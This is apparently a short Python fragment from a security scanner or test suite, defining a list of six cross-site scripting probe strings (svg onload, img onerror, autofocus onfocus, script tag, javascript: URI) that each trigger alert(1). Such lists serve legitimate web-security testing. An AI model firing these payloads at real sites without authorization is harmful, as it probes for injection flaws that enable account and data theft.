XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '" autofocus onfocus=alert(1) x="',
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
]